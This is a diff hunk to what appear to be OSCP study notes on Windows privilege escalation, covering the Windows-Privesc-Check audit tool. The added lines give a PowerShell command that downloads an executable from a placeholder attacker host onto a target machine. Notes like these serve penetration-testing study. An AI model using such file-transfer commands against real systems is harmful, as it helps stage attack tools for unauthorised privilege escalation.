@@ -8,6 +8,9 @@ https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.htm
 
 Windows-Privesc-Check
 
+download file
+powershell IWR -Uri http[:]//myip/filename.exe -OutFile filename.exe
+
 Usage:
 windows-privesc-check2.exe --audit -a -o wpc-report
 
